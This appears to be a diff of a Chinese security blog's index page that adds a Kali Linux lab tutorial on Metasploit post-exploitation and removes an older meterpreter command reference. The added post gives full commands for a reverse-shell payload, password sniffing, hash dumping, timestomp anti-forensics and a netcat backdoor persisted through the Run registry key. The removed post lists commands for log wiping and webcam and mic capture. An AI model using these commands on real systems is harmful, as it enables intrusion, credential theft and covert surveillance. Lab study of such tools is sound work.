@@ -240,6 +240,344 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B9%9D)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86+%E5%90%8E%E9%97%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B9%9D)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86+%E5%90%8E%E9%97%A8/" itemprop="url">Kali Linux笔记(一百零九)：MSF后渗透测试--信息收集+后门</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-03T15:35:04+08:00">
+                2020-03-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  988 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-实验环境"><a href="#1-实验环境" class="headerlink" title="1. 实验环境"></a>1. 实验环境</h4><ul>
+<li>Window 7<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong> 查看IP地址</li>
+<li>关闭防火墙，关闭UAC并重启</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong> 查看IP地址</li>
+<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong> </li>
+<li><strong><code>🔺命令：service apache2 start</code></strong> </li>
+<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong> </li>
+<li><strong><code>🔺命令：msfconsole -q</code></strong> </li>
+<li><strong><code>🔺命令：use exploit/multi/handler</code></strong> <ul>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong> <ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
+<li><strong><code>🔺命令：exploit</code></strong> </li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
+<li>双击打开1.exe</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看是否拿到shell</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-抓包（metrepreter）"><a href="#2-抓包（metrepreter）" class="headerlink" title="2. 抓包（metrepreter）"></a>2. 抓包（metrepreter）</h4><ul>
+<li>在内存中缓存区块循环存储抓包（50000包），不写硬盘</li>
+<li>智能过来meterpreter流量，传输全程使用SSL/TLS加密</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：load sniffer</code></strong> <ul>
+<li><strong><code>🔺命令：sniffer_interfaces</code></strong>  </li>
+<li><strong><code>🔺命令：sniffer_start 2</code></strong>  </li>
+<li><strong><code>🔺命令：sniffer_dump 2 1.cap</code></strong>  </li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>浏览器访问路由器，输入密码</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：sniffer_dump 2 2.cap</code></strong> （含有密码信息）</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-解码"><a href="#3-解码" class="headerlink" title="3. 解码"></a>3. 解码</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：use auxiliary/sniffer/psnuffle</code></strong> </li>
+<li><strong><code>🔺命令：set PCAPFILE /root/2.cap</code></strong> </li>
+<li><strong><code>🔺命令：run</code></strong> </li>
+</ul>
+</li>
+</ul>
+<h4 id="4-搜索文件（meterpreter）"><a href="#4-搜索文件（meterpreter）" class="headerlink" title="4. 搜索文件（meterpreter）"></a>4. 搜索文件（meterpreter）</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：search -f *.ini</code></strong>  </li>
+<li><strong><code>🔺命令：search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.docx</code></strong> </li>
+</ul>
+</li>
+</ul>
+<h4 id="5-John-the-Ripper破解弱口令"><a href="#5-John-the-Ripper破解弱口令" class="headerlink" title="5. John the Ripper破解弱口令"></a>5. John the Ripper破解弱口令</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：use post/windows/gather/hashdump</code></strong>   #system权限的meterpreter<ul>
+<li><strong><code>🔺命令：set session sessionID</code></strong> </li>
+<li><strong><code>🔺命令：run</code></strong>   #结果保存在/tmp目录下</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：use auxiliary/analyze/jtr_crack_fast</code></strong> <ul>
+<li><strong><code>🔺命令：run</code></strong> </li>
+</ul>
+</li>
+<li>▲ 2020.03.03 暂无jtr_crack_fast此模块</li>
+</ul>
+</li>
+</ul>
+<h4 id="6-MAC时间"><a href="#6-MAC时间" class="headerlink" title="6. MAC时间"></a>6. MAC时间</h4><ul>
+<li>文件系统访问会留下痕迹，电子取证重点关注</li>
+<li>渗透测试和攻击者往往希望销毁文件系统访问痕迹</li>
+<li>最好的避免被电子取证发现的方法：不要碰文件系统<ul>
+<li>Meterpreter的先天优势所在（完全基于内存）</li>
+</ul>
+</li>
+<li>MAC时间（Modified / Accessed / Created）<ul>
+<li><strong><code>🔺命令：echo aaaa &gt; 1.txt</code></strong> </li>
+<li><strong><code>🔺命令：ls -l --time=atime/ctime 1.txt</code></strong> （默认的时间为modified time）</li>
+<li>列出文件的MAC时间：<strong><code>🔺命令：stat 1.txt</code></strong> </li>
+<li>修改文件的MAC时间<ul>
+<li><strong><code>🔺命令：touch -d &quot;2 days ago&quot; 1.txt</code></strong> （Created时间）</li>
+<li><strong><code>🔺命令：touch -t 1501010101 1.txt</code></strong> （Modified和Accessed时间）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>MACE：MFT entry<ul>
+<li>MFT：NTFS文件系统的主文件分配表Master File Table</li>
+<li>通常1024字节或2个硬盘扇区，其中存放多项entry信息</li>
+<li>包含文件大量信息（大小、名称、目录位置、磁盘位置、创建时间）</li>
+<li>更多信息可研究文件系统取证分析技术</li>
+<li>▲ 可通过修改文件名称来查看E的变化</li>
+</ul>
+</li>
+</ul>
+<h4 id="7-Timestomp（meterpreter）"><a href="#7-Timestomp（meterpreter）" class="headerlink" title="7. Timestomp（meterpreter）"></a>7. Timestomp（meterpreter）</h4><ul>
+<li>Kali<ul>
+<li>timestomp参数<ul>
+<li>-v：显示详细MAC时间</li>
+<li>-f：指定模板文件时间作为复制</li>
+<li>-b -r（递归擦除）：擦除MAC时间信息，目前此参数功能失效</li>
+<li>-a/-c/-m/-e：修改MACE的A/C/M/E参数的时间</li>
+<li>-z：修改MACE的所有参数的时间</li>
+</ul>
+</li>
+<li>▲ EnCase工具在电子取证中很出名</li>
+<li><strong><code>🔺命令：timestomp -v 1.txt</code></strong>  </li>
+<li><strong><code>🔺命令：timestomp -f c:\\autoexec.bat 1.txt</code></strong> </li>
+<li><strong><code>🔺命令：timestomp -z &quot;MM/DD/YYYY HH24:MI:SS&quot;  2.txt</code></strong> </li>
+</ul>
+</li>
+</ul>
+<h4 id="8-用注册表添加NC后门服务、打开防火墙端口（meterpreter）"><a href="#8-用注册表添加NC后门服务、打开防火墙端口（meterpreter）" class="headerlink" title="8. 用注册表添加NC后门服务、打开防火墙端口（meterpreter）"></a>8. 用注册表添加NC后门服务、打开防火墙端口（meterpreter）</h4><ul>
+<li>注册表保存着windows几乎全部配置参数<ul>
+<li>如果修改不当，可直接造成系统崩溃</li>
+<li>修改前完整备份注册表</li>
+<li>某些注册表的修改是不可逆的</li>
+</ul>
+</li>
+<li>常见用途<ul>
+<li>修改、增加启动项</li>
+<li>窃取存储于注册表中的机密信息</li>
+<li>绕过文件型病毒查杀</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32</code></strong> </li>
+<li>查看Window 7系统启动程序：<strong><code>🔺命令：reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</code></strong>  </li>
+<li>在查看的主键在新建监制：<strong><code>🔺命令：reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#39;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&#39;</code></strong> </li>
+<li><strong><code>🔺命令：reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</code></strong> </li>
+<li><strong><code>🔺命令：execute -f cmd -i -H</code></strong>  </li>
+<li><strong><code>🔺命令：netsh firewall show opmode</code></strong>  </li>
+<li><strong><code>🔺命令：netsh firewall add portopening TCP 4444 &quot;test&quot; ENABLE ALL</code></strong>  </li>
+<li><strong><code>🔺命令：shutdown -r -t 0</code></strong>  </li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li><strong><code>🔺命令：netstat -nao</code></strong> 查看是否开启了4444端口</li>
+<li><strong><code>🔺命令：tasklist</code></strong> 查看进程的PID</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：nc Kali的IP 4444</code></strong> </li>
+</ul>
+</li>
+<li>其他注册表项<ul>
+<li><a href="https://support.accessdata.com/hc/en-us/articles/204448155-RegistryQuick-Find-Chart" target="_blank" rel="noopener">https://support.accessdata.com/hc/en-us/articles/204448155-RegistryQuick-Find-Chart</a></li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AB)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Token%E6%8F%90%E6%9D%83/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -3743,296 +4081,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE)%EF%BC%9AMeterpreter%20Shell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE)%EF%BC%9AMeterpreter%20Shell/" itemprop="url">Kali Linux笔记(一百)：Meterpreter Shell</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-26T15:36:20+08:00">
-                2020-02-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  960 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  3 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-Meterpreter"><a href="#1-Meterpreter" class="headerlink" title="1. Meterpreter"></a>1. Meterpreter</h4><ul>
-<li>高级、动态、可扩展的Payload（同Nanocode同样的多功能payload）<ul>
-<li>基于meterpreter上下文利用更多漏洞发起攻击</li>
-<li>后渗透测试阶段一站式操作界面</li>
-</ul>
-</li>
-<li>完全基于内存的DLL注入式payload（不写硬盘，硬盘查杀无效果）<ul>
-<li>注入合法系统进程并建立stager</li>
-<li>基于stager上传和预加载DLL进行扩展模块的注入（客户端API）</li>
-<li>基于stager建立的socket连接建立加密的TLS/1.0通信隧道</li>
-<li>利用TLS隧道进一步加载后续扩展模块（避免网络取证）</li>
-</ul>
-</li>
-<li>服务端使用C语言编写</li>
-<li>客户端提供基于ruby的全特性API（支持任何语言）</li>
-</ul>
-<h4 id="2-Meterpreter基本命令"><a href="#2-Meterpreter基本命令" class="headerlink" title="2. Meterpreter基本命令"></a>2. Meterpreter基本命令</h4><ul>
-<li><strong><code>🔺命令：help</code></strong>：查看meterpreter可使用的命令</li>
-<li><strong><code>🔺命令：background</code></strong>：回到msfconsole的界面</li>
-<li><strong><code>🔺命令：pwd</code></strong>：可查看到window下的目录路径</li>
-<li><strong><code>🔺命令：cd</code></strong>：进入window下一个目录</li>
-<li><strong><code>🔺命令：dir/ls</code></strong>：查看本目录文件</li>
-<li><strong><code>🔺命令：cat</code></strong>：查看文件内容</li>
-<li><strong><code>🔺命令：mkdir/rmdir</code></strong>：创建/删除一个的目录</li>
-<li><strong><code>🔺命令：mv</code></strong>：对文件进行改名</li>
-<li><strong><code>🔺命令：rm</code></strong>：删除一个文件</li>
-<li><strong><code>🔺命令：edit</code></strong>：编辑目标文件</li>
-<li><strong><code>🔺命令：lpwd</code></strong>：local远端机器本地目录</li>
-<li><strong><code>🔺命令：lcd</code></strong>：进入local远端机器本地目录的其他目录</li>
-<li><strong><code>🔺命令：run</code></strong>：前端运行</li>
-<li>⭐ <strong><code>🔺命令：bgrun</code></strong>：后台运行脚本<ul>
-<li>▲ 有大量脚本，enum_ie/enum_share/hashdump等</li>
-</ul>
-</li>
-<li>⭐ <strong><code>🔺命令：clearev</code></strong>：清除目标系统日志<br> -（Win+R → eventvwr → 应用程序/安全性/系统 → 一般会在系统日志留下痕迹）</li>
-<li><strong><code>🔺命令：download</code></strong>：下载文件到本地系统<ul>
-<li><strong><code>🔺命令：upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32</code></strong></li>
-</ul>
-</li>
-<li>⭐ <strong><code>🔺命令：execute -f cmd.exe -i –H</code></strong>：执行一个命令<ul>
-<li>-f：执行的程序</li>
-<li>-i：进行交互性shell</li>
-<li>-H：程序进行隐藏</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：getuid</code></strong>：查看登陆的账号</li>
-<li><strong><code>🔺命令：getsystem</code></strong>：如若账号为非system，则提权为system</li>
-<li><strong><code>🔺命令：getprivs</code></strong>：查看被控机器账号权限</li>
-<li><strong><code>🔺命令：getproxy</code></strong>：获取被控机器浏览器设置的代理</li>
-<li><strong><code>🔺命令：getpid</code></strong>：当前注入的合法进程的PID号</li>
-<li><strong><code>🔺命令：migrate PID</code></strong>：可进行进程迁移</li>
-<li><strong><code>🔺命令：hashdump</code></strong>：dump被控机器账号的hash值<ul>
-<li><strong><code>🔺命令：run post/windows/gather/hashdump</code></strong> </li>
-</ul>
-</li>
-<li><strong><code>🔺命令：sysinfo</code></strong>：系统信息</li>
-<li><strong><code>🔺命令：kill PID</code></strong>：杀死进程，通过PID去杀死</li>
-<li><strong><code>🔺命令：shell</code></strong>：获取操作系统的shell</li>
-<li><strong><code>🔺命令：show_mount</code></strong>：挂载的操作系统分区</li>
-<li>̵<strong><code>🔺命令：search -f autoexec.bat</code></strong>：搜索目录</li>
-<li><strong><code>🔺命令：arp</code></strong>：查看被控机器的arp</li>
-<li><strong><code>🔺命令：netstat</code></strong>：查看被控机器网络连接情况</li>
-<li><strong><code>🔺命令：ifconfig/ipconfig</code></strong>：查看IP情况</li>
-<li><strong><code>🔺命令：route</code></strong>：查看路由表（可添加路由表）</li>
-<li><strong><code>🔺命令：idletime</code></strong>：查看被控机器当前空闲时间</li>
-<li><strong><code>🔺命令：resource</code></strong>：调用外部资源文件，可为可执行的指令文件</li>
-<li><strong><code>🔺命令：record_mic</code></strong>：记录被控机器麦克风的声音</li>
-<li><strong><code>🔺命令： webcam_list</code></strong>：列出被控机器所以的摄像头<ul>
-<li><strong><code>🔺命令：webcam_snap -i 1 -v false</code></strong>（每个一秒钟进行拍照）</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-Meterpreter-Python扩展"><a href="#3-Meterpreter-Python扩展" class="headerlink" title="3. Meterpreter Python扩展"></a>3. Meterpreter Python扩展</h4><ul>
-<li>2015年11月份，来自社区的贡献</li>
-<li>▲ 无需运行环境，在客户端运行原生python代码</li>
-<li><strong><code>🔺命令：load python</code></strong><ul>
-<li><strong><code>🔺命令：Help</code></strong></li>
-<li><strong><code>🔺命令：python_execute &quot;print (&#39;asdasdas&#39;)&quot;</code></strong> </li>
-<li><strong><code>🔺命令：python_execute &quot;import os; cd = os.getcwd()&quot; -r cd</code></strong> </li>
-<li><strong><code>🔺命令：python_import -f find.py</code></strong>  ▲ 2020.2.26 Command executed without returing a result</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">for root,dirs,files in os.walk(&quot;C:\\&quot;):</span><br><span class="line">    for file in files:</span><br><span class="line">        if file.endswith(&quot;.ini&quot;) and file.startswith(&quot;win&quot;):</span><br><span class="line">            print(os.path.john(root.file))</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-实验"><a href="#4-实验" class="headerlink" title="4. 实验"></a>4. 实验</h4><ul>
-<li>Kali主机<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-</ul>
-</li>
-<li>Window XP SP3主机<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-<li>关闭防火墙，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
-</ul>
-</li>
-<li>Kali主机<ul>
-<li><strong><code>🔺命令：msconsole</code></strong><ul>
-<li><strong><code>🔺命令：use exploit/windows/browser/ms08_067_netapi</code></strong><ul>
-<li><strong><code>🔺命令：set RHOST Window Xp的IP</code></strong></li>
-<li><strong><code>🔺命令：set target 34</code></strong></li>
-<li><strong><code>🔺命令：set PAYLOAD windows/meterpreter/reverse_tcp</code></strong><ul>
-<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
-<li><strong><code>🔺命令：set LPORT 4444</code></strong> </li>
-</ul>
-</li>
-<li><strong><code>🔺命令：show options</code></strong></li>
-<li><strong><code>🔺命令：exploit -j</code></strong></li>
-<li><strong><code>🔺命令：sessions -l</code></strong></li>
-<li><strong><code>🔺命令：sessions -i 1</code></strong>（进入的是meterpreter的shell）</li>
-<li><strong><code>🔺命令：meterpreter</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -4087,7 +4135,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">166</span>
+                  <span class="site-state-item-count">167</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -4194,7 +4242,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">150.5k</span>
+    <span title="Site words total count">150.6k</span>
   
 </div>
 
